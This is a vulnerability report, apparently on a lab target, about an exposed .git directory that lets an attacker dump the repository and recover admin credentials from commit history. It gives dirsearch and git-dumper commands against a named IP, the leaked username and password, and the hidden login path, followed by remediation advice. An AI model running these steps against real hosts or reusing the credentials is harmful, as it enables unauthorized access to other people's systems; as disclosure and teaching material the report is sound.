## Summary

Exposure of a publicly accessible `.git` directory allowed full repository disclosure and retrieval of sensitive credentials from Git history, leading to unauthorized administrative access.

---

## Description

The application exposes its `.git` directory to the public, allowing attackers to download the entire source code repository.

By leveraging tools such as `git-dumper`, an attacker can reconstruct the repository, including all files and commit history.

During analysis of the repository, sensitive credentials were discovered in a previous commit. Although these credentials were removed in later versions, they remain accessible through Git history.

An attacker can use these leaked credentials to authenticate as an administrator and gain access to restricted areas of the application.

This vulnerability results in a full compromise of the application's authentication mechanism.

---

## Steps to Reproduce

1. Perform directory fuzzing on the target:

```id="lcf9y7"
dirsearch -u http://138.68.89.185/
```

2. Identify the exposed `.git` directory:

```id="8p9i5p"
http://138.68.89.185/.git/
```

3. Dump the repository:

```id="dcub3q"
git-dumper http://138.68.89.185/.git/ dump
```

4. Analyze the dumped repository and discover a hidden path:

```id="h7r1ws"
/S3cR3tPaTh
```

5. Inspect the Git history:

```id="7a4a8k"
git log
git show <commit>
```

6. Extract credentials from a previous commit:

```id="z4vq8r"
ADMIN_USER = Administrator
ADMIN_PASS = FN3ymbZNaF8
```

7. Navigate to the login page:

```id="6bbh6c"
http://138.68.89.185/S3cR3tPaTh/login.php
```

8. Authenticate using the leaked credentials → Administrative access granted ✅

---

### Request:

```id="rz3n6o"
GET /.git/logs/HEAD HTTP/1.1
Host: 138.68.89.185
```

### Response:

```id="u8l5yz"
commit: Add admin creds
commit: Move secrets to environment variables
```

---

## Impact

* Full source code disclosure
* Exposure of sensitive credentials
* Unauthorized administrative access
* Complete compromise of application security

An attacker can gain full control over the application, access protected functionality, and potentially escalate further depending on the system configuration.

---

## Affected Endpoint(s)

* /.git/
* /.git/logs/HEAD
* /S3cR3tPaTh/login.php

---

## Vulnerability Details

* Publicly accessible `.git` directory
* Sensitive data stored in Git history
* Improper secret management practices
* Lack of access control on sensitive resources

---

## Proof of Concept (PoC)

```id="b9m5m6"
git-dumper http://138.68.89.185/.git/ dump

cd dump
git log
git show <commit>
```

---

## Recommendation (Fix)

* Restrict access to the `.git/` directory via web server configuration
* Remove sensitive files from the production environment
* Rewrite Git history using tools like `git filter-repo` to remove secrets
* Avoid storing credentials in source code
* Use environment variables or secure secret management solutions
* Immediately rotate all exposed credentials

---

## Severity

**High**

Reason: Exposure of sensitive credentials leading to administrative access and full application compromise.

---

## Additional Information

This issue highlights the risks of exposing version control systems and relying on improper secret management practices.

---

## Reporter

Name: khaled waled

Handle(github): khaledvvaled  
